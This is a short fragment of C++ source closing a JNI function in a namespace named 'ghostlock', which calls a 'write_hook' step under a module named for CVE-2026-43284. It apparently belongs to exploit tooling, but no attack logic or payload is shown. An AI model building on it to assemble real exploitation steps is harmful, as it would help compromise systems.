        return backend::cve_2026_43284::steps::write_hook(request, &refusal);
    }

}  // namespace ghostlock::jni

